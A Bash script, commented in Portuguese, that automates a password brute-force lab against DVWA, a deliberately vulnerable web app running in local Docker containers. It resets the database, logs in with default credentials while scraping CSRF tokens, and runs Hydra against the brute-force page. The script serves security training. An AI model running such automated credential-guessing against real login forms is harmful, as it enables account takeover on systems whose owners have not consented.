#!/bin/bash
# Script para brute force no DVWA usando Hydra
# Requer apenas: docker compose up -d
# Automatiza: Create/Reset Database, Login e Hydra (security=low via cookie) — sem passos manuais

set -e

CONTAINER="${ATTACKER_CONTAINER:-attacker}"
WORDLIST_DIR="${WORDLIST_DIR:-/wordlists}"
DVWA_URL="http://dvwa"
COOKIE_FILE="/tmp/dvwa_cookies.txt"

echo "=== DVWA - Brute Force com Hydra (totalmente automatizado) ==="
echo ""

# --- 1. Create/Reset Database (se necessário) ---
echo "[1/3] Verificando e configurando o banco de dados..."
for i in 1 2 3 4 5; do
  SETUP_PAGE=$(docker exec "$CONTAINER" curl -s -c "$COOKIE_FILE" --connect-timeout 5 "$DVWA_URL/setup.php" 2>/dev/null || true)
  [ -n "$SETUP_PAGE" ] && break
  echo "    Aguardando DVWA... ($i/5)"
  sleep 3
done
[ -z "$SETUP_PAGE" ] && { echo "Erro: DVWA não acessível. Verifique se os containers estão rodando."; exit 1; }
# Verifica se precisa criar o banco (página de setup mostra o botão)
if echo "$SETUP_PAGE" | grep -q "Create / Reset Database"; then
  SETUP_TOKEN=$(echo "$SETUP_PAGE" | sed -n "s/.*name='user_token' value='\([^']*\)'.*/\1/p")
  if [ -n "$SETUP_TOKEN" ]; then
    docker exec "$CONTAINER" curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" -L \
      -d "create_db=Create+%2F+Reset+Database&user_token=$SETUP_TOKEN" \
      "$DVWA_URL/setup.php" > /dev/null
    echo "    Banco de dados criado/resetado."
  else
    echo "    Aviso: Token não encontrado. Tentando sem token..."
    docker exec "$CONTAINER" curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" -L \
      -d "create_db=Create+%2F+Reset+Database" \
      "$DVWA_URL/setup.php" > /dev/null
  fi
else
  echo "    Banco já configurado."
fi

# Limpar cookies antigos e obter nova sessão para login
docker exec "$CONTAINER" rm -f "$COOKIE_FILE" 2>/dev/null || true

# --- 2. Login e obter sessão ---
echo "[2/3] Obtendo sessão autenticada (admin:password)..."
LOGIN_PAGE=$(docker exec "$CONTAINER" curl -s -c "$COOKIE_FILE" "$DVWA_URL/login.php")
USER_TOKEN=$(echo "$LOGIN_PAGE" | sed -n "s/.*name='user_token' value='\([^']*\)'.*/\1/p")

if [ -z "$USER_TOKEN" ]; then
  echo "    Aviso: Token CSRF não encontrado. Tentando login sem token..."
  docker exec "$CONTAINER" curl -s -c "$COOKIE_FILE" -b "$COOKIE_FILE" -L \
    -d "username=admin&password=password&Login=Login" \
    "$DVWA_URL/login.php" > /dev/null
else
  docker exec "$CONTAINER" curl -s -c "$COOKIE_FILE" -b "$COOKIE_FILE" -L \
    -d "username=admin&password=password&Login=Login&user_token=$USER_TOKEN" \
    "$DVWA_URL/login.php" > /dev/null
fi

PHPSESSID=$(docker exec "$CONTAINER" grep PHPSESSID "$COOKIE_FILE" 2>/dev/null | awk '{print $NF}' || echo "")
if [ -z "$PHPSESSID" ]; then
  echo "Erro: Não foi possível obter sessão após login."
  echo "Verifique se o container dvwa está rodando e acessível."
  exit 1
fi

# --- 3. Hydra com security=low (via cookie no parâmetro -m) ---
echo "[3/3] Executando Hydra contra /vulnerabilities/brute/..."
docker exec "$CONTAINER" hydra -l admin -P "$WORDLIST_DIR/passwords.txt" dvwa http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=$PHPSESSID; security=low:S=Welcome to the password protected" \
  -t 4 -w 10 -v

docker exec "$CONTAINER" rm -f "$COOKIE_FILE" 2>/dev/null || true
echo ""
echo "=== Hydra concluído ==="
